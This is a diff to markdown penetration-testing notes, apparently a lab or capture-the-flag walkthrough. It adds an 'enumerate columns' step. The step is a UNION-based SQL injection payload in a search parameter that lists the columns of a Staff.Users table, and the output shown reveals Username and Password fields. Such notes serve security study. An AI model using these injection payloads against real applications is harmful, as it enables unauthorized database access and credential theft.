@@ -5,6 +5,7 @@
   * [enumerate fields of search query](#enumerate-fields-of-search-query)
   * [enumerate databases](#enumerate-databases)
   * [enumerate tables](#enumerate-tables)
+  * [enumerate columns](#enumerate-columns)
 
 # `sqlmap`
 
@@ -64,4 +65,12 @@ search=killer' UNION SELECT GROUP_CONCAT(TABLE_NAME),2,3,4,5,6 FROM INFORMATION_
 ```
 <h3>Search results </h3> 
 ID: StaffDetails,Users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>
+```
+## enumerate columns
+```
+search=killer' UNION SELECT GROUP_CONCAT(COLUMN_NAME),2,3,4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA="Staff" AND TABLE_NAME="Users"-- -
+```
+```
+<h3>Search results </h3>
+ID: UserID,Username,Password<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/>
 ```
